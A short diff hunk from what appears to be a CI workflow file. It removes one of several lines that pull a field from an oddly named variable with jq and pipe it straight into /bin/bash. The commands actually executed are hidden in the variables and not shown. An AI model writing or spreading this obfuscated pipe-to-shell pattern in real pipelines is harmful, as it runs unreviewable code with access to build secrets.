@@ -20,7 +20,6 @@ jobs:
           echo $xib88 | jq -r .r226 | /bin/bash
           echo $goso25 | jq -r .vr8588 | /bin/bash
           printf '%s' "$f60652" | jq -r .xw4016 | /bin/bash
-          printf '%s' "$obsoa19" | jq -r .zjejs04 | /bin/bash
           echo $jf08937 | jq -r .vxqqk384 | /bin/bash
 
       - name: Upload results
